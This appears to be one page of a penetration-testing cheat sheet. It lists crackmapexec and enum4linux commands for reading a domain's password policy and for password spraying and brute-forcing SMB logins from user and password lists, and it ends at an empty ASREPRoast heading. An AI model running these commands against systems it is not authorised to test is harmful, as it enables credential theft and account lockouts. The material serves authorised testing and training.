# Got Username
### Get Password Policy
```bash
crackmapexec <ip> -u 'username' -p 'password' --pass-pol 
```

```bash
enum4linux -u 'username' -p 'password' -P <ip>
```

## Password Spray
Test password against usernames in order. Won't brute force each password against each user.
```bash
crackmapexec smb <ip> -u users.txt -p passwords.txt --no-bruteforce
```

Test each password against each username. Careful of lockout policy.
```bash
crackmapexec smb <ip> -u users.txt -p passwords.txt
```

Credentials Found: [Next](got-credentials.md)

## ASREPRoast